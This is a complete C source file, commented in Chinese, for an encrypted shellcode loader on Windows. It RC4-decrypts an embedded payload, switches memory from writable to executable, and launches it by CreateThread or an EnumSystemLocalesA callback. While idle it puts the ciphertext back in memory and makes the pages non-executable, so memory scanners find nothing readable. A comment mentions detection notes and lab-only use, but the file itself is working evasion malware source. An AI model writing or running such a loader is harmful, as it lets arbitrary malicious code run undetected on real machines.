// 加密载荷加载器完整实现：RC4 运行时解密 → RW→RX → 执行；空闲期睡眠加密（密态回置）
//
// 用法：loader.exe [mode]
//   mode 0（默认）：CreateThread 执行 + 睡眠加密循环（空闲期 RX→RW 回置密文，
//                   唤醒再解密——内存扫描窗口内只见密文）
//   mode 1        ：回调执行（EnumSystemLocalesA）替代 CreateThread——
//                   线程起始地址仍指向本进程私有内存，但创建源不再是 CreateThread
// 睡眠加密实现要点：RC4 为对称流密码，同钥再加密 = 还原明文——因此密态回置不是
// "再加密一次"而是**回拷原始密文 BUF**（loader 内嵌密文即睡眠态镜像）。
//
// 前置：python3 payload.py <shellcode.bin> [key] 生成 payload.h（KEY/BUF/LEN）
// 构建：x86_64-w64-mingw32-gcc -mwindows -o loader.exe loader.c
// 检测侧配对见 NOTES.md；仅本地实验环境使用
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "payload.h"

static void rc4(const char* key, const unsigned char* in, unsigned char* out, unsigned int n) {
    unsigned char S[256]; unsigned int i, j = 0;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + (unsigned char)key[i % (strlen(key) ? strlen(key) : 1)]) % 256;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    unsigned int a = 0; j = 0;
    for (unsigned int k = 0; k < n; k++) {
        a = (a + 1) % 256; j = (j + S[a]) % 256;
        unsigned char t = S[a]; S[a] = S[j]; S[j] = t;
        out[k] = in[k] ^ S[(S[a] + S[j]) % 256];
    }
}

static unsigned char* region;      /* RW 解密区（执行时翻 RX） */
static volatile LONG running = 1;  /* 载荷线程存活标志 */

static void encrypt_region(void) { /* 密态回置：回拷内嵌密文（而非再加密） */
    DWORD old;
    VirtualProtect(region, LEN, PAGE_READWRITE, &old);   /* RX → RW */
    memcpy(region, BUF, LEN);                            /* 明文消失，仅存密文 */
    VirtualProtect(region, LEN, PAGE_READONLY, &old);    /* RW → R（睡眠期不可执行） */
}

static void decrypt_region(void) { /* 唤醒解密：密文 → 明文，翻 RX */
    DWORD old;
    VirtualProtect(region, LEN, PAGE_READWRITE, &old);   /* R → RW */
    rc4(KEY, BUF, region, LEN);                          /* 解密（覆盖密文） */
    VirtualProtect(region, LEN, PAGE_EXECUTE_READ, &old);/* RW → RX */
}

int main(int argc, char** argv) {
    int mode = (argc > 1) ? atoi(argv[1]) : 0;

    region = (unsigned char*)VirtualAlloc(NULL, LEN, MEM_COMMIT, PAGE_READWRITE);
    if (!region) { printf("[-] 分配失败\n"); return 1; }
    rc4(KEY, BUF, region, LEN);
    DWORD old;
    VirtualProtect(region, LEN, PAGE_EXECUTE_READ, &old);   /* RW→RX，无 RWX 窗口 */

    HANDLE t = NULL;
    if (mode == 1) {
        /* 回调执行：EnumSystemLocalesA(lpfn, 0)——首个系统区域回调即执行载荷 */
        EnumSystemLocalesA((LOCALE_ENUMPROCA)region, 0);
    } else {
        t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)region, NULL, 0, NULL);
        if (!t) { printf("[-] CreateThread 失败\n"); return 2; }
    }

    /* ── 睡眠加密循环（mode 0 专用；mode 1 同步返回后同样可加密回置）──
     * 每 2s：密态回置 → 休眠 2s（此窗口内存扫描只见密文 + 不可执行页）
     *       → 解密唤醒 → 再运行 2s。演示循环 4 轮。 */
    for (int round = 0; round < 4 && InterlockedCompareExchange(&running, 1, 1); round++) {
        if (mode == 0) {
            if (WaitForSingleObject(t, 2000) != WAIT_TIMEOUT) break;  /* 载荷已退 */
            encrypt_region();
            Sleep(2000);
            decrypt_region();
        } else {
            encrypt_region();
            Sleep(2000);
            decrypt_region();
        }
    }

    if (t) WaitForSingleObject(t, 3000);
    encrypt_region();                                        /* 收尾回密态再释放 */
    VirtualFree(region, 0, MEM_RELEASE);
    printf("[+] 完成（mode=%d）\n", mode);
    return 0;
}
